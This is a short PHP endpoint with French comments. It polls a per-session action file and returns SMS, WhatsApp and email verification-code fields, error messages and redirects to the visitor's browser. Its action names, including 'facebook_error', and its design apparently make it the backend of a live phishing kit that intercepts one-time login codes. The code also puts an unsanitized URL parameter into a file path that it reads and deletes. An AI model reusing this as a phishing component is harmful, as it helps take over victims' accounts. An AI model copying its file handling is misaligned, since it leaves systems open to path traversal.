<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Paramètres manquants']);
    exit;
}

// Vérifier s'il y a une action à effectuer
$actionFile = 'sessions/' . $sessionId . '_action.json';
$response = ['action' => null];

if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    
  ///  var_dump($actionData);
    if (isset($actionData['action'])) {
        // Actions spéciales qui ne doivent pas déclencher de redirection
        $nonRedirectActions = [
            'sms_code_submitted',
            'sms_resend_requested',
            'whatsapp_code_submitted',
            'email_code_submitted'
        ];
        
        // Ne pas renvoyer l'action si elle est dans la liste des actions spéciales
        if (!in_array($actionData['action'], $nonRedirectActions)) {
            $response['action'] = $actionData['action'];
            
            // Ajouter des données supplémentaires si nécessaire
            if (isset($actionData['smsCode'])) {
                $response['smsCode'] = $actionData['smsCode'];
            }
            
            if (isset($actionData['whatsappCode'])) {
                $response['whatsappCode'] = $actionData['whatsappCode'];
            }
            
            if (isset($actionData['emailCode'])) {
                $response['emailCode'] = $actionData['emailCode'];
            }
            
            if (isset($actionData['errorMessage'])) {
                $response['errorMessage'] = $actionData['errorMessage'];
            }
            
            if (isset($actionData['redirect'])) {
                $response['redirect'] = $actionData['redirect'];
            }
        }
          
        // Ne pas supprimer le fichier d'action pour les erreurs, car elles seront traitées par la page
        if ($actionData['action'] !== 'sms_error' &&  
            $actionData['action'] !== 'whatsapp_error' &&  
            $actionData['action'] !== 'email_error' &&
            $actionData['action'] !== 'facebook_error') {
            
            // Supprimer le fichier d'action seulement si ce n'est pas une action spéciale
            if (!in_array($actionData['action'], $nonRedirectActions)) {
                unlink($actionFile);
            }
        }
    }
}

// Renvoyer la réponse au format JSON
header('Content-Type: application/json');
echo json_encode($response);